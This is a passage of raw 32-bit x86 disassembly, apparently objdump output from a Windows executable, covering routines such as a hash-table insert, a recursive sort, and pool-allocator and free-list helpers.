  40c4ed:	je     0x40c502
  40c4ef:	mov    eax,DWORD PTR [edi]
  40c4f1:	mov    ds:0x421ba8,eax
  40c4f6:	xor    eax,eax
  40c4f8:	mov    DWORD PTR [edi],eax
  40c4fa:	mov    DWORD PTR [edi+0x4],eax
  40c4fd:	mov    DWORD PTR [edi+0x8],eax
  40c500:	jmp    0x40c54a
  40c502:	mov    eax,ds:0x422b90
  40c507:	cmp    eax,0xc
  40c50a:	jge    0x40c531
  40c50c:	cmp    eax,0x4
  40c50f:	jb     0x40c51e
  40c511:	mov    ecx,DWORD PTR ds:0x422b8c
  40c517:	mov    edx,eax
  40c519:	call   0x40cec0
  40c51e:	mov    ecx,0x200
  40c523:	call   0x40c940
  40c528:	mov    ecx,eax
  40c52a:	mov    eax,0x200
  40c52f:	jmp    0x40c537
  40c531:	mov    ecx,DWORD PTR ds:0x422b8c
  40c537:	sub    eax,0xc
  40c53a:	mov    edi,ecx
  40c53c:	add    ecx,0xc
  40c53f:	mov    ds:0x422b90,eax
  40c544:	mov    DWORD PTR ds:0x422b8c,ecx
  40c54a:	mov    eax,DWORD PTR [ebp+0x8]
  40c54d:	mov    DWORD PTR [edi+0x4],eax
  40c550:	mov    DWORD PTR [edi+0x8],0x1
  40c557:	inc    DWORD PTR ds:0x40e0a8
  40c55d:	push   eax
  40c55e:	call   DWORD PTR ds:0x40e0b0
  40c564:	movzx  eax,ax
  40c567:	cdq    
  40c568:	add    esp,0x4
  40c56b:	idiv   DWORD PTR ds:0x40e0ac
  40c571:	mov    ecx,DWORD PTR ds:0x40e0a4
  40c577:	lea    eax,[edi+0x4]
  40c57a:	mov    ecx,DWORD PTR [ecx+edx*4]
  40c57d:	mov    DWORD PTR [edi],ecx
  40c57f:	mov    ecx,DWORD PTR ds:0x40e0a4
  40c585:	mov    DWORD PTR [ecx+edx*4],edi
  40c588:	pop    edi
  40c589:	pop    esi
  40c58a:	pop    ebp
  40c58b:	ret    0x8
  40c58e:	int3   
  40c58f:	int3   
  40c590:	push   ebp
  40c591:	mov    ebp,esp
  40c593:	sub    esp,0xc
  40c596:	push   ebx
  40c597:	mov    ebx,ecx
  40c599:	mov    ecx,DWORD PTR [ebp+0x8]
  40c59c:	push   esi
  40c59d:	lea    esi,[ecx+0x1]
  40c5a0:	push   edi
  40c5a1:	mov    DWORD PTR [ebp-0x4],edx
  40c5a4:	mov    DWORD PTR [ebp-0x8],esi
  40c5a7:	mov    edi,edx
  40c5a9:	cmp    edx,ecx
  40c5ab:	jge    0x40c688
  40c5b1:	mov    eax,ds:0x4244bc
  40c5b6:	mov    esi,DWORD PTR [ebp-0x4]
  40c5b9:	lea    esp,[esp+0x0]
  40c5c0:	inc    edi
  40c5c1:	cmp    edi,ecx
  40c5c3:	jge    0x40c5dc
  40c5c5:	push   DWORD PTR [ebx+esi*4]
  40c5c8:	push   DWORD PTR [ebx+edi*4]
  40c5cb:	call   eax
  40c5cd:	mov    ecx,DWORD PTR [ebp+0x8]
  40c5d0:	add    esp,0x8
  40c5d3:	test   eax,eax
  40c5d5:	mov    eax,ds:0x4244bc
  40c5da:	jle    0x40c5c0
  40c5dc:	mov    esi,DWORD PTR [ebp-0x8]
  40c5df:	mov    DWORD PTR [ebp-0xc],edi
  40c5e2:	mov    edi,DWORD PTR [ebp-0x4]
  40c5e5:	dec    esi
  40c5e6:	cmp    esi,edi
  40c5e8:	jle    0x40c5fe
  40c5ea:	push   DWORD PTR [ebx+edi*4]
  40c5ed:	push   DWORD PTR [ebx+esi*4]
  40c5f0:	call   eax
  40c5f2:	add    esp,0x8
  40c5f5:	test   eax,eax
  40c5f7:	mov    eax,ds:0x4244bc
  40c5fc:	jns    0x40c5e5
  40c5fe:	mov    edi,DWORD PTR [ebp-0xc]
  40c601:	mov    eax,DWORD PTR [ebx+esi*4]
  40c604:	mov    DWORD PTR [ebp-0x8],esi
  40c607:	cmp    esi,edi
  40c609:	jle    0x40c619
  40c60b:	mov    ecx,DWORD PTR [ebx+edi*4]
  40c60e:	mov    DWORD PTR [ebx+edi*4],eax
  40c611:	mov    DWORD PTR [ebx+esi*4],ecx
  40c614:	mov    ecx,DWORD PTR [ebp+0x8]
  40c617:	jmp    0x40c5b1
  40c619:	mov    edi,DWORD PTR [ebp-0x4]
  40c61c:	mov    edx,DWORD PTR [ebp+0x8]
  40c61f:	mov    ecx,DWORD PTR [ebx+edi*4]
  40c622:	mov    DWORD PTR [ebx+edi*4],eax
  40c625:	mov    DWORD PTR [ebx+esi*4],ecx
  40c628:	mov    ecx,edx
  40c62a:	mov    eax,esi
  40c62c:	sub    ecx,esi
  40c62e:	sub    eax,edi
  40c630:	cmp    eax,ecx
  40c632:	jl     0x40c653
  40c634:	push   edx
  40c635:	lea    edx,[esi+0x1]
  40c638:	mov    ecx,ebx
  40c63a:	call   0x40c590
  40c63f:	lea    eax,[edi+0x1]
  40c642:	add    esp,0x4
  40c645:	cmp    eax,esi
  40c647:	jge    0x40c688
  40c649:	lea    ecx,[esi-0x1]
  40c64c:	mov    DWORD PTR [ebp+0x8],ecx
  40c64f:	mov    edx,edi
  40c651:	jmp    0x40c67b
  40c653:	lea    eax,[edi+0x1]
  40c656:	cmp    eax,esi
  40c658:	jge    0x40c66a
  40c65a:	lea    eax,[esi-0x1]
  40c65d:	push   eax
  40c65e:	mov    edx,edi
  40c660:	mov    ecx,ebx
  40c662:	call   0x40c590
  40c667:	add    esp,0x4
  40c66a:	mov    ecx,DWORD PTR [ebp+0x8]
  40c66d:	lea    edx,[esi+0x1]
  40c670:	lea    esi,[ecx+0x1]
  40c673:	mov    DWORD PTR [ebp-0x4],edx
  40c676:	mov    edi,edx
  40c678:	mov    DWORD PTR [ebp-0x8],esi
  40c67b:	mov    eax,ds:0x4244bc
  40c680:	cmp    edx,ecx
  40c682:	jl     0x40c5b6
  40c688:	pop    edi
  40c689:	pop    esi
  40c68a:	pop    ebx
  40c68b:	mov    esp,ebp
  40c68d:	pop    ebp
  40c68e:	ret    
  40c68f:	int3   
  40c690:	push   ebp
  40c691:	mov    ebp,esp
  40c693:	push   ecx
  40c694:	push   ebx
  40c695:	push   esi
  40c696:	mov    ebx,ecx
  40c698:	push   edi
  40c699:	mov    edi,edx
  40c69b:	mov    edx,ebx
  40c69d:	lea    ecx,[edx+0x2]
  40c6a0:	mov    ax,WORD PTR [edx]
  40c6a3:	add    edx,0x2
  40c6a6:	test   ax,ax
  40c6a9:	jne    0x40c6a0
  40c6ab:	sub    edx,ecx
  40c6ad:	sar    edx,1
  40c6af:	inc    edx
  40c6b0:	mov    ecx,ebx
  40c6b2:	call   0x402110
  40c6b7:	mov    ecx,eax
  40c6b9:	mov    DWORD PTR [ebp-0x4],ecx
  40c6bc:	cmp    ecx,0xfffffff8
  40c6bf:	jae    0x40c711
  40c6c1:	mov    edx,DWORD PTR [edi+0x4]
  40c6c4:	lea    eax,[ecx+0x3]
  40c6c7:	mov    ecx,0x400
  40c6cc:	and    eax,0xfffffffc
  40c6cf:	sub    ecx,edx
  40c6d1:	cmp    ecx,eax
  40c6d3:	jb     0x40c6e4
  40c6d5:	mov    ecx,DWORD PTR [ebp-0x4]
  40c6d8:	lea    esi,[edi+0xc]
  40c6db:	add    esi,edx
  40c6dd:	add    eax,edx
  40c6df:	mov    DWORD PTR [edi+0x4],eax
  40c6e2:	jmp    0x40c713
  40c6e4:	add    eax,0x4
  40c6e7:	push   eax
  40c6e8:	push   0x0
  40c6ea:	push   DWORD PTR ds:0x40e648
  40c6f0:	call   DWORD PTR ds:0x4242c4
  40c6f6:	test   eax,eax
  40c6f8:	je     0x40c70a
  40c6fa:	mov    ecx,DWORD PTR [edi+0x8]
  40c6fd:	mov    DWORD PTR [eax],ecx
  40c6ff:	mov    ecx,DWORD PTR [ebp-0x4]
  40c702:	mov    DWORD PTR [edi+0x8],eax
  40c705:	lea    esi,[eax+0x4]
  40c708:	jmp    0x40c713
  40c70a:	mov    ecx,DWORD PTR [ebp-0x4]
  40c70d:	xor    esi,esi
  40c70f:	jmp    0x40c713
  40c711:	xor    esi,esi
  40c713:	test   esi,esi
  40c715:	jne    0x40c720
  40c717:	pop    edi
  40c718:	pop    esi
  40c719:	xor    eax,eax
  40c71b:	pop    ebx
  40c71c:	mov    esp,ebp
  40c71e:	pop    ebp
  40c71f:	ret    
  40c720:	mov    edx,ebx
  40c722:	lea    edi,[edx+0x2]
  40c725:	mov    ax,WORD PTR [edx]
  40c728:	add    edx,0x2
  40c72b:	test   ax,ax
  40c72e:	jne    0x40c725
  40c730:	sub    edx,edi
  40c732:	push   ecx
  40c733:	sar    edx,1
  40c735:	push   esi
  40c736:	inc    edx
  40c737:	mov    ecx,ebx
  40c739:	call   0x401e10
  40c73e:	add    esp,0x8
  40c741:	neg    eax
  40c743:	sbb    eax,eax
  40c745:	pop    edi
  40c746:	and    eax,esi
  40c748:	pop    esi
  40c749:	pop    ebx
  40c74a:	mov    esp,ebp
  40c74c:	pop    ebp
  40c74d:	ret    
  40c74e:	int3   
  40c74f:	int3   
  40c750:	push   ebp
  40c751:	mov    ebp,esp
  40c753:	push   ecx
  40c754:	push   ebx
  40c755:	push   esi
  40c756:	mov    ebx,ecx
  40c758:	push   edi
  40c759:	mov    edi,edx
  40c75b:	mov    edx,ebx
  40c75d:	lea    ecx,[edx+0x1]
  40c760:	mov    al,BYTE PTR [edx]
  40c762:	inc    edx
  40c763:	test   al,al
  40c765:	jne    0x40c760
  40c767:	sub    edx,ecx
  40c769:	inc    edx
  40c76a:	mov    ecx,ebx
  40c76c:	call   0x4020a0
  40c771:	lea    ecx,[eax+eax*1]
  40c774:	mov    DWORD PTR [ebp-0x4],eax
  40c777:	cmp    ecx,0xfffffff8
  40c77a:	jae    0x40c7c0
  40c77c:	mov    edx,DWORD PTR [edi+0x4]
  40c77f:	add    ecx,0x3
  40c782:	mov    eax,0x400
  40c787:	and    ecx,0xfffffffc
  40c78a:	sub    eax,edx
  40c78c:	cmp    eax,ecx
  40c78e:	jb     0x40c79d
  40c790:	lea    esi,[edi+0xc]
  40c793:	lea    eax,[edx+ecx*1]
  40c796:	add    esi,edx
  40c798:	mov    DWORD PTR [edi+0x4],eax
  40c79b:	jmp    0x40c7c2
  40c79d:	lea    eax,[ecx+0x4]
  40c7a0:	push   eax
  40c7a1:	push   0x0
  40c7a3:	push   DWORD PTR ds:0x40e648
  40c7a9:	call   DWORD PTR ds:0x4242c4
  40c7af:	test   eax,eax
  40c7b1:	je     0x40c7c0
  40c7b3:	mov    ecx,DWORD PTR [edi+0x8]
  40c7b6:	mov    DWORD PTR [eax],ecx
  40c7b8:	mov    DWORD PTR [edi+0x8],eax
  40c7bb:	lea    esi,[eax+0x4]
  40c7be:	jmp    0x40c7c2
  40c7c0:	xor    esi,esi
  40c7c2:	test   esi,esi
  40c7c4:	jne    0x40c7cf
  40c7c6:	pop    edi
  40c7c7:	pop    esi
  40c7c8:	xor    eax,eax
  40c7ca:	pop    ebx
  40c7cb:	mov    esp,ebp
  40c7cd:	pop    ebp
  40c7ce:	ret    
  40c7cf:	mov    edx,ebx
  40c7d1:	lea    ecx,[edx+0x1]
  40c7d4:	mov    al,BYTE PTR [edx]
  40c7d6:	inc    edx
  40c7d7:	test   al,al
  40c7d9:	jne    0x40c7d4
  40c7db:	push   DWORD PTR [ebp-0x4]
  40c7de:	sub    edx,ecx
  40c7e0:	push   esi
  40c7e1:	inc    edx
  40c7e2:	mov    ecx,ebx
  40c7e4:	call   0x401cb0
  40c7e9:	add    esp,0x8
  40c7ec:	neg    eax
  40c7ee:	sbb    eax,eax
  40c7f0:	pop    edi
  40c7f1:	and    eax,esi
  40c7f3:	pop    esi
  40c7f4:	pop    ebx
  40c7f5:	mov    esp,ebp
  40c7f7:	pop    ebp
  40c7f8:	ret    
  40c7f9:	int3   
  40c7fa:	int3   
  40c7fb:	int3   
  40c7fc:	int3   
  40c7fd:	int3   
  40c7fe:	int3   
  40c7ff:	int3   
  40c800:	push   ebp
  40c801:	mov    ebp,esp
  40c803:	push   ecx
  40c804:	push   ebx
  40c805:	push   esi
  40c806:	mov    esi,ecx
  40c808:	push   edi
  40c809:	mov    edi,edx
  40c80b:	mov    DWORD PTR [ebp-0x4],ecx
  40c80e:	lea    edx,[esi+0x2]
  40c811:	mov    ax,WORD PTR [esi]
  40c814:	add    esi,0x2
  40c817:	test   ax,ax
  40c81a:	jne    0x40c811
  40c81c:	sub    esi,edx
  40c81e:	sar    esi,1
  40c820:	lea    ebx,[esi*2+0x2]
  40c827:	cmp    ebx,0xfffffff8
  40c82a:	jae    0x40c87d
  40c82c:	mov    edx,DWORD PTR [edi+0x4]
  40c82f:	lea    ecx,[ebx+0x3]
  40c832:	mov    eax,0x400
  40c837:	and    ecx,0xfffffffc
  40c83a:	sub    eax,edx
  40c83c:	cmp    eax,ecx
  40c83e:	jb     0x40c850
  40c840:	lea    eax,[edx+ecx*1]
  40c843:	mov    ecx,DWORD PTR [ebp-0x4]
  40c846:	lea    esi,[edi+0xc]
  40c849:	add    esi,edx
  40c84b:	mov    DWORD PTR [edi+0x4],eax
  40c84e:	jmp    0x40c87f
  40c850:	lea    eax,[ecx+0x4]
  40c853:	push   eax
  40c854:	push   0x0
  40c856:	push   DWORD PTR ds:0x40e648
  40c85c:	call   DWORD PTR ds:0x4242c4
  40c862:	test   eax,eax
  40c864:	je     0x40c876
  40c866:	mov    ecx,DWORD PTR [edi+0x8]
  40c869:	mov    DWORD PTR [eax],ecx
  40c86b:	mov    ecx,DWORD PTR [ebp-0x4]
  40c86e:	mov    DWORD PTR [edi+0x8],eax
  40c871:	lea    esi,[eax+0x4]
  40c874:	jmp    0x40c87f
  40c876:	mov    ecx,DWORD PTR [ebp-0x4]
  40c879:	xor    esi,esi
  40c87b:	jmp    0x40c87f
  40c87d:	xor    esi,esi
  40c87f:	test   esi,esi
  40c881:	jne    0x40c88c
  40c883:	pop    edi
  40c884:	pop    esi
  40c885:	xor    eax,eax
  40c887:	pop    ebx
  40c888:	mov    esp,ebp
  40c88a:	pop    ebp
  40c88b:	ret    
  40c88c:	push   0x0
  40c88e:	push   0x0
  40c890:	push   ebx
  40c891:	push   esi
  40c892:	push   0xffffffff
  40c894:	push   ecx
  40c895:	push   0x0
  40c897:	push   0x0
  40c899:	call   DWORD PTR ds:0x424358
  40c89f:	neg    eax
  40c8a1:	sbb    eax,eax
  40c8a3:	pop    edi
  40c8a4:	and    eax,esi
  40c8a6:	pop    esi
  40c8a7:	pop    ebx
  40c8a8:	mov    esp,ebp
  40c8aa:	pop    ebp
  40c8ab:	ret    
  40c8ac:	int3   
  40c8ad:	int3   
  40c8ae:	int3   
  40c8af:	int3   
  40c8b0:	push   ebp
  40c8b1:	mov    ebp,esp
  40c8b3:	mov    edx,DWORD PTR [ebp+0x8]
  40c8b6:	push   esi
  40c8b7:	mov    esi,ecx
  40c8b9:	cmp    edx,0xfffffff8
  40c8bc:	jae    0x40c91b
  40c8be:	push   edi
  40c8bf:	mov    edi,DWORD PTR [esi+0x4]
  40c8c2:	add    edx,0x3
  40c8c5:	mov    eax,0x400
  40c8ca:	and    edx,0xfffffffc
  40c8cd:	sub    eax,edi
  40c8cf:	cmp    eax,edx
  40c8d1:	jb     0x40c8e6
  40c8d3:	lea    ecx,[esi+0xc]
  40c8d6:	lea    eax,[edi+edx*1]
  40c8d9:	add    ecx,edi
  40c8db:	mov    DWORD PTR [esi+0x4],eax
  40c8de:	pop    edi
  40c8df:	mov    eax,ecx
  40c8e1:	pop    esi
  40c8e2:	pop    ebp
  40c8e3:	ret    0x4
  40c8e6:	lea    eax,[edx+0x4]
  40c8e9:	push   eax
  40c8ea:	push   0x0
  40c8ec:	push   DWORD PTR ds:0x40e648
  40c8f2:	call   DWORD PTR ds:0x4242c4
  40c8f8:	mov    ecx,eax
  40c8fa:	test   ecx,ecx
  40c8fc:	je     0x40c911
  40c8fe:	mov    eax,DWORD PTR [esi+0x8]
  40c901:	mov    DWORD PTR [ecx],eax
  40c903:	mov    DWORD PTR [esi+0x8],ecx
  40c906:	add    ecx,0x4
  40c909:	pop    edi
  40c90a:	mov    eax,ecx
  40c90c:	pop    esi
  40c90d:	pop    ebp
  40c90e:	ret    0x4
  40c911:	xor    ecx,ecx
  40c913:	pop    edi
  40c914:	mov    eax,ecx
  40c916:	pop    esi
  40c917:	pop    ebp
  40c918:	ret    0x4
  40c91b:	xor    eax,eax
  40c91d:	pop    esi
  40c91e:	pop    ebp
  40c91f:	ret    0x4
  40c922:	int3   
  40c923:	int3   
  40c924:	int3   
  40c925:	int3   
  40c926:	int3   
  40c927:	int3   
  40c928:	int3   
  40c929:	int3   
  40c92a:	int3   
  40c92b:	int3   
  40c92c:	int3   
  40c92d:	int3   
  40c92e:	int3   
  40c92f:	int3   
  40c930:	ret    0x4
  40c933:	int3   
  40c934:	int3   
  40c935:	int3   
  40c936:	int3   
  40c937:	int3   
  40c938:	int3   
  40c939:	int3   
  40c93a:	int3   
  40c93b:	int3   
  40c93c:	int3   
  40c93d:	int3   
  40c93e:	int3   
  40c93f:	int3   
  40c940:	push   ecx
  40c941:	push   0x1
  40c943:	push   ecx
  40c944:	call   DWORD PTR ds:0x424424
  40c94a:	add    esp,0x8
  40c94d:	test   eax,eax
  40c94f:	je     0x40c953
  40c951:	pop    ecx
  40c952:	ret    
  40c953:	push   0x0
  40c955:	mov    edx,0x4010c0
  40c95a:	mov    ecx,0x5e5
  40c95f:	call   0x407010
  40c964:	int3   
  40c965:	int3   
  40c966:	int3   
  40c967:	int3   
  40c968:	int3   
  40c969:	int3   
  40c96a:	int3   
  40c96b:	int3   
  40c96c:	int3   
  40c96d:	int3   
  40c96e:	int3   
  40c96f:	int3   
  40c970:	push   ecx
  40c971:	call   DWORD PTR ds:0x42441c
  40c977:	pop    ecx
  40c978:	ret    
  40c979:	int3   
  40c97a:	int3   
  40c97b:	int3   
  40c97c:	int3   
  40c97d:	int3   
  40c97e:	int3   
  40c97f:	int3   
  40c980:	push   ecx
  40c981:	push   esi
  40c982:	mov    esi,ecx
  40c984:	push   edi
  40c985:	cmp    esi,0x200
  40c98b:	jl     0x40c996
  40c98d:	call   0x40c940
  40c992:	pop    edi
  40c993:	pop    esi
  40c994:	pop    ecx
  40c995:	ret    
  40c996:	cmp    esi,0x4
  40c999:	jae    0x40c9a0
  40c99b:	mov    esi,0x4
  40c9a0:	mov    edi,DWORD PTR [esi*4+0x420378]
  40c9a7:	test   edi,edi
  40c9a9:	je     0x40c9c6
  40c9ab:	mov    ecx,DWORD PTR [edi]
  40c9ad:	push   esi
  40c9ae:	push   0x0
  40c9b0:	push   edi
  40c9b1:	mov    DWORD PTR [esi*4+0x420378],ecx
  40c9b8:	call   0x40db72
  40c9bd:	add    esp,0xc
  40c9c0:	mov    eax,edi
  40c9c2:	pop    edi
  40c9c3:	pop    esi
  40c9c4:	pop    ecx
  40c9c5:	ret    
  40c9c6:	mov    eax,ds:0x422bb0
  40c9cb:	cmp    eax,esi
  40c9cd:	jge    0x40c9f4
  40c9cf:	cmp    eax,0x4
  40c9d2:	jb     0x40c9e1
  40c9d4:	mov    ecx,DWORD PTR ds:0x422bac
  40c9da:	mov    edx,eax
  40c9dc:	call   0x40ca10
  40c9e1:	mov    ecx,0x200
  40c9e6:	call   0x40c940
  40c9eb:	mov    ecx,eax
  40c9ed:	mov    eax,0x200
  40c9f2:	jmp    0x40c9fa
  40c9f4:	mov    ecx,DWORD PTR ds:0x422bac
  40c9fa:	sub    eax,esi
  40c9fc:	mov    ds:0x422bb0,eax
  40ca01:	mov    eax,ecx
  40ca03:	add    ecx,esi
  40ca05:	pop    edi
  40ca06:	mov    DWORD PTR ds:0x422bac,ecx
  40ca0c:	pop    esi
  40ca0d:	pop    ecx
  40ca0e:	ret    
  40ca0f:	int3   
  40ca10:	cmp    edx,0x200
  40ca16:	jge    0x40c970
  40ca1c:	cmp    edx,0x4
  40ca1f:	jae    0x40ca26
  40ca21:	mov    edx,0x4
  40ca26:	mov    eax,DWORD PTR [edx*4+0x420378]
  40ca2d:	mov    DWORD PTR [ecx],eax
  40ca2f:	mov    DWORD PTR [edx*4+0x420378],ecx
  40ca36:	ret    
  40ca37:	int3   
  40ca38:	int3   
  40ca39:	int3   
  40ca3a:	int3   
  40ca3b:	int3   
  40ca3c:	int3   
  40ca3d:	int3   
  40ca3e:	int3   
  40ca3f:	int3   
  40ca40:	push   ebp
  40ca41:	mov    ebp,esp
  40ca43:	push   ebx
  40ca44:	push   esi
  40ca45:	push   edi
  40ca46:	mov    edi,edx
  40ca48:	mov    ebx,ecx
  40ca4a:	test   edi,edi
  40ca4c:	js     0x40cac3
  40ca4e:	mov    edx,DWORD PTR [ebp+0x8]
  40ca51:	cmp    edx,edi
  40ca53:	jl     0x40cac3
  40ca55:	cmp    edi,0x200
  40ca5b:	jl     0x40ca6d
  40ca5d:	push   edx
  40ca5e:	push   ebx
  40ca5f:	call   DWORD PTR ds:0x424428
  40ca65:	add    esp,0x8
  40ca68:	pop    edi
  40ca69:	pop    esi
  40ca6a:	pop    ebx
  40ca6b:	pop    ebp
  40ca6c:	ret    
  40ca6d:	mov    ecx,DWORD PTR ds:0x422bac
  40ca73:	lea    eax,[ebx+edi*1]
  40ca76:	cmp    eax,ecx
  40ca78:	jne    0x40ca9f
  40ca7a:	mov    esi,DWORD PTR ds:0x422bb0
  40ca80:	mov    eax,edx
  40ca82:	sub    eax,edi
  40ca84:	cmp    esi,eax
  40ca86:	jl     0x40ca9f
  40ca88:	sub    esi,eax
  40ca8a:	add    ecx,eax
  40ca8c:	mov    DWORD PTR ds:0x422bb0,esi
  40ca92:	mov    DWORD PTR ds:0x422bac,ecx
  40ca98:	mov    eax,ebx
  40ca9a:	pop    edi
  40ca9b:	pop    esi
  40ca9c:	pop    ebx
  40ca9d:	pop    ebp
  40ca9e:	ret    
  40ca9f:	mov    ecx,edx
  40caa1:	call   0x40c980
  40caa6:	push   edi
  40caa7:	mov    esi,eax
  40caa9:	push   ebx
  40caaa:	push   esi
  40caab:	call   0x40db6c
  40cab0:	add    esp,0xc
  40cab3:	mov    edx,edi
  40cab5:	mov    ecx,ebx
  40cab7:	call   0x40ca10
  40cabc:	pop    edi
  40cabd:	mov    eax,esi
  40cabf:	pop    esi
  40cac0:	pop    ebx
  40cac1:	pop    ebp
  40cac2:	ret    
  40cac3:	xor    edx,edx
  40cac5:	mov    ecx,0x5dc
  40caca:	call   0x407110
  40cacf:	int3   
  40cad0:	push   ecx
  40cad1:	push   esi
  40cad2:	mov    esi,ecx
  40cad4:	push   edi
  40cad5:	cmp    esi,0x200
  40cadb:	jl     0x40cae6
  40cadd:	call   0x40c940
  40cae2:	pop    edi
  40cae3:	pop    esi
  40cae4:	pop    ecx
  40cae5:	ret    
  40cae6:	cmp    esi,0x4
  40cae9:	jae    0x40caf0
  40caeb:	mov    esi,0x4
  40caf0:	mov    edi,DWORD PTR [esi*4+0x41f378]
  40caf7:	test   edi,edi
  40caf9:	je     0x40cb16
  40cafb:	mov    ecx,DWORD PTR [edi]
  40cafd:	push   esi
  40cafe:	push   0x0
  40cb00:	push   edi
  40cb01:	mov    DWORD PTR [esi*4+0x41f378],ecx
  40cb08:	call   0x40db72
  40cb0d:	add    esp,0xc
  40cb10:	mov    eax,edi
  40cb12:	pop    edi
  40cb13:	pop    esi
  40cb14:	pop    ecx
  40cb15:	ret    
  40cb16:	mov    eax,ds:0x422ba8
  40cb1b:	cmp    eax,esi
  40cb1d:	jge    0x40cb44
  40cb1f:	cmp    eax,0x4
  40cb22:	jb     0x40cb31
  40cb24:	mov    ecx,DWORD PTR ds:0x422ba4
  40cb2a:	mov    edx,eax
  40cb2c:	call   0x40cb60
  40cb31:	mov    ecx,0x200
  40cb36:	call   0x40c940
  40cb3b:	mov    ecx,eax
  40cb3d:	mov    eax,0x200
  40cb42:	jmp    0x40cb4a
  40cb44:	mov    ecx,DWORD PTR ds:0x422ba4
  40cb4a:	sub    eax,esi
  40cb4c:	mov    ds:0x422ba8,eax
  40cb51:	mov    eax,ecx
  40cb53:	add    ecx,esi
  40cb55:	pop    edi
  40cb56:	mov    DWORD PTR ds:0x422ba4,ecx
  40cb5c:	pop    esi
  40cb5d:	pop    ecx
  40cb5e:	ret    
  40cb5f:	int3   
  40cb60:	cmp    edx,0x200
  40cb66:	jge    0x40c970
  40cb6c:	cmp    edx,0x4
  40cb6f:	jae    0x40cb76
  40cb71:	mov    edx,0x4
  40cb76:	mov    eax,DWORD PTR [edx*4+0x41f378]
  40cb7d:	mov    DWORD PTR [ecx],eax
  40cb7f:	mov    DWORD PTR [edx*4+0x41f378],ecx
  40cb86:	ret    
  40cb87:	int3   
  40cb88:	int3   
  40cb89:	int3   
  40cb8a:	int3   
  40cb8b:	int3   
  40cb8c:	int3   
  40cb8d:	int3   
  40cb8e:	int3   
  40cb8f:	int3   
  40cb90:	push   ebp
  40cb91:	mov    ebp,esp
  40cb93:	push   ebx
  40cb94:	push   esi
  40cb95:	push   edi
  40cb96:	mov    edi,edx
  40cb98:	mov    ebx,ecx
  40cb9a:	test   edi,edi
  40cb9c:	js     0x40cc13
  40cb9e:	mov    edx,DWORD PTR [ebp+0x8]
  40cba1:	cmp    edx,edi
  40cba3:	jl     0x40cc13
  40cba5:	cmp    edi,0x200
  40cbab:	jl     0x40cbbd
  40cbad:	push   edx
  40cbae:	push   ebx
  40cbaf:	call   DWORD PTR ds:0x424428
  40cbb5:	add    esp,0x8
  40cbb8:	pop    edi
  40cbb9:	pop    esi
  40cbba:	pop    ebx
  40cbbb:	pop    ebp
  40cbbc:	ret    
  40cbbd:	mov    ecx,DWORD PTR ds:0x422ba4
  40cbc3:	lea    eax,[ebx+edi*1]
  40cbc6:	cmp    eax,ecx
  40cbc8:	jne    0x40cbef
  40cbca:	mov    esi,DWORD PTR ds:0x422ba8
  40cbd0:	mov    eax,edx
  40cbd2:	sub    eax,edi
  40cbd4:	cmp    esi,eax
  40cbd6:	jl     0x40cbef
  40cbd8:	sub    esi,eax
  40cbda:	add    ecx,eax
  40cbdc:	mov    DWORD PTR ds:0x422ba8,esi
  40cbe2:	mov    DWORD PTR ds:0x422ba4,ecx
  40cbe8:	mov    eax,ebx
  40cbea:	pop    edi
  40cbeb:	pop    esi
  40cbec:	pop    ebx
  40cbed:	pop    ebp
  40cbee:	ret    
  40cbef:	mov    ecx,edx
  40cbf1:	call   0x40cad0
  40cbf6:	push   edi
  40cbf7:	mov    esi,eax
  40cbf9:	push   ebx
  40cbfa:	push   esi
  40cbfb:	call   0x40db6c
  40cc00:	add    esp,0xc
  40cc03:	mov    edx,edi
  40cc05:	mov    ecx,ebx
  40cc07:	call   0x40cb60
  40cc0c:	pop    edi
  40cc0d:	mov    eax,esi
  40cc0f:	pop    esi
  40cc10:	pop    ebx
  40cc11:	pop    ebp
  40cc12:	ret    
  40cc13:	xor    edx,edx
  40cc15:	mov    ecx,0x5dc
  40cc1a:	call   0x407110
  40cc1f:	int3   
  40cc20:	push   ecx
  40cc21:	push   esi
  40cc22:	mov    esi,ecx
  40cc24:	push   edi
  40cc25:	cmp    esi,0x200
  40cc2b:	jl     0x40cc36
  40cc2d:	call   0x40c940
  40cc32:	pop    edi
  40cc33:	pop    esi
  40cc34:	pop    ecx
  40cc35:	ret    
  40cc36:	cmp    esi,0x4
  40cc39:	jae    0x40cc40
  40cc3b:	mov    esi,0x4
  40cc40:	mov    edi,DWORD PTR [esi*4+0x41fb78]
  40cc47:	test   edi,edi
  40cc49:	je     0x40cc66
  40cc4b:	mov    ecx,DWORD PTR [edi]
  40cc4d:	push   esi
  40cc4e:	push   0x0
  40cc50:	push   edi
  40cc51:	mov    DWORD PTR [esi*4+0x41fb78],ecx
  40cc58:	call   0x40db72
  40cc5d:	add    esp,0xc
  40cc60:	mov    eax,edi
  40cc62:	pop    edi
  40cc63:	pop    esi
  40cc64:	pop    ecx
  40cc65:	ret    
  40cc66:	mov    eax,ds:0x422ba0
  40cc6b:	cmp    eax,esi
  40cc6d:	jge    0x40cc94
  40cc6f:	cmp    eax,0x4
  40cc72:	jb     0x40cc81
  40cc74:	mov    ecx,DWORD PTR ds:0x422b9c
  40cc7a:	mov    edx,eax
  40cc7c:	call   0x40ccb0
  40cc81:	mov    ecx,0x200
  40cc86:	call   0x40c940
  40cc8b:	mov    ecx,eax
  40cc8d:	mov    eax,0x200
  40cc92:	jmp    0x40cc9a
  40cc94:	mov    ecx,DWORD PTR ds:0x422b9c
  40cc9a:	sub    eax,esi
  40cc9c:	mov    ds:0x422ba0,eax
  40cca1:	mov    eax,ecx
  40cca3:	add    ecx,esi
  40cca5:	pop    edi
  40cca6:	mov    DWORD PTR ds:0x422b9c,ecx
  40ccac:	pop    esi
  40ccad:	pop    ecx
  40ccae:	ret    
  40ccaf:	int3   
  40ccb0:	cmp    edx,0x200
  40ccb6:	jge    0x40c970
  40ccbc:	cmp    edx,0x4
  40ccbf:	jae    0x40ccc6
  40ccc1:	mov    edx,0x4
  40ccc6:	mov    eax,DWORD PTR [edx*4+0x41fb78]
  40cccd:	mov    DWORD PTR [ecx],eax
  40cccf:	mov    DWORD PTR [edx*4+0x41fb78],ecx
  40ccd6:	ret    
  40ccd7:	int3   
  40ccd8:	int3   
  40ccd9:	int3   
  40ccda:	int3   
  40ccdb:	int3   
  40ccdc:	int3   
  40ccdd:	int3   
  40ccde:	int3   
  40ccdf:	int3   
  40cce0:	push   ebp
  40cce1:	mov    ebp,esp
  40cce3:	push   ebx
  40cce4:	push   esi
  40cce5:	push   edi
  40cce6:	mov    edi,edx
  40cce8:	mov    ebx,ecx
  40ccea:	test   edi,edi
  40ccec:	js     0x40cd63
